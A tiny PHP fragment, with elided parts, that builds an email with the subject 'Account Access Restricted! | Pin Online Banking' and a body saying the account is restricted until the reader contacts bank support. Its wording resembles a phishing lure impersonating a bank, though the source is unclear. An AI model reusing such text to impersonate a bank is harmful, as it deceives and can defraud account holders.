...
$mail->Subject = 'Account Access Restricted! | Pin Online Banking';
	...
	$body .= "<td style='border:none;'><strong>Your account access has been temporarily restricted. To remove restrictions contact the bank support.</strong><br><br></td></td>";
